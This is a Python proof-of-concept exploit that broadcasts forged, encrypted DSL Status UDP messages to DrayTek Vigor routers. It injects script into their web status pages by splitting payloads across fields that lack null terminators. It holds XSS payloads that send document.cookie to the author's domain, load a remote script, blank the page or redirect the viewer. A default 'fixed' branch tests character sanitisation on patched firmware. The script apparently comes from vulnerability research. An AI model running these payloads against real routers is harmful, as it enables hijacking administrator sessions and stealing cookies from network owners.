#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# This file is part of DrayTek-Tools <https://github.com/Matthew1471/DrayTek-Tools>
# Copyright (C) 2024 Matthew1471!
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""
This example exploits DrayTek® Vigor™ DSL Status message broadcasts.
"""

# We output the date and time.
from datetime import datetime

# We use the system socket APIs to send network traffic.
import socket

# The program arguments are read.
import sys

# We use the sleep function to prevent flooding the receivers.
from time import sleep

# All the shared DrayTek® DSL Status message functions are in this package.
from draytek_tools.dsl_status import cryptography, Message


def send_data(mac_address):
    """
    Sends DSL Status message broadcasts on the network.

    This method takes a MAC address, encrypts a DSL Status message
    sample and sends it repeatedly.

    Args:
        mac_address (string): The MAC address of the sending device.

    Returns:
        None
    """

    # Make a new DSL Status message.
    message = Message()

    # We set these values just for fun.
    message.dsl_upload_speed = -2147483648
    message.dsl_download_speed = -2147483648
    message.adsl_tx_cells = -2147483648
    message.adsl_rx_cells = -2147483648
    message.adsl_tx_crc_errors = -2147483648
    message.adsl_rx_crc_errors = -2147483648
    message.dsl_type = Message.DslType.ADSL.value
    message.timestamp = -2147483648
    message.vdsl_snr_upload = -2147483648
    message.vdsl_snr_download = -2147483648
    message.adsl_loop_att = -2147483648
    message.adsl_snr_margin = -2147483648

    # Whether to attempt JavaScript injection via HTML or escaping the JavaScript variable.
    method = 'fixed'

    if method == 'html':
        # The malicious strings (64 characters maximum).
        #malicious_string = '<script>alert("This router was hacked by Matthew!!!!!")</script>'
        #malicious_string = '<script>location="//matthew1471.co.uk?"+document.cookie</script>'
        #malicious_string = '<script>document.body.innerHTML = ""</script>'
        #malicious_string = '<script>parent.location="//is.gd/DrayT"</script>'
        
        # You can even reference longer scripts elsewhere.
        malicious_string = '<script src="//matthew1471.co.uk/r.js"></script>'

        # Abuse the lack of null-terminators in these fields.
        # The data will be duplicated but that does not matter so long as you do not use single quotes.
        message.modem_firmware_version = malicious_string[:20].encode()
        message.running_mode = malicious_string[20:38].encode()
        message.state = malicious_string[38:64].encode()
    elif method == 'html_textarea':
        # The malicious strings (19 characters maximum).
        #malicious_string = '<font size=7>Hi!!!!'
        malicious_string = '<h1>Hi!!!!!!!!</h1>'
        #malicious_string = '<h1>Hi!!!!!!!!!!!!!'

        # Null-termination fixed in this beta.
        # State is now 25->15 bytes so modem_firmware_version is the new longest.
        message.modem_firmware_version = malicious_string[:19].encode()
    elif method == 'js':
        # The malicious strings (26 characters maximum).
        malicious_string = '\';alert("Hacked by Me!")//'
        #malicious_string = '\';location="//t.ly/A111"//'

        # Abuse the lack of null-terminators in these fields.
        # The data will be duplicated so you cannot use single quotes as single quotes mess up 
        # the JavaScript code; if you wish to use single quotes and be syntactically valid you
        # are limited to the payload length of 1 field ("state" being the largest at 26 bytes).
        message.state = malicious_string[:26].encode()
    elif method == 'fixed':
        # Data is now sanitised.
        valid_characters = b'!#$&()*+,-./0123456789:;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_`abcdefghijklmnopqrstuvwxyz~\x7F'
        forbidden_characters = b' "%\'<>\\^{|}'
        space_test = b'Testing\x14123\0'

        message.modem_firmware_version = valid_characters[-20:] + b'\0'
        message.running_mode = valid_characters[-37:-19] + b'\0'
        message.state = valid_characters[-51:-36] + b'\0'

    # Convert the payload to bytes (allowing unsafe null byte replacement).
    message_bytes = message.convert_to_bytes(unsafe=True)

    # Get the encrypted payload for the specified MAC address.
    encrypted_message = cryptography.encrypt_bytes(
        mac_address,
        message_bytes
    )

    # Create a UDP socket to send DSL Status messages.
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:

        # Permit sending of broadcast messages.
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # Repeat until the program is exited.
        while True:
            # Notify the user a malicious DSL Status message is being sent.
            print(
                datetime.now().strftime("%d/%m/%Y %H:%M:%S") +
                ' - Sending malicious DSL Status message via UDP broadcast.'
            )

            # Send the DSL Status message to the broadcast address on UDP port 4944.
            sock.sendto(encrypted_message, ('255.255.255.255', 4944))

            # Wait 10 seconds to avoid flooding the broadcast receivers.
            sleep(10)

if __name__ == '__main__':
    # Check whether the user has supplied a source MAC address.
    if len(sys.argv) != 2:
        print('Usage:')
        print(f'{sys.argv[0]} <Network Card\'s MAC Address>\n')
        print(f'e.g. {sys.argv[0]} aa:bb:cc:dd:ee:ff')
        sys.exit(1)

    # Start sending data.
    send_data(sys.argv[1])
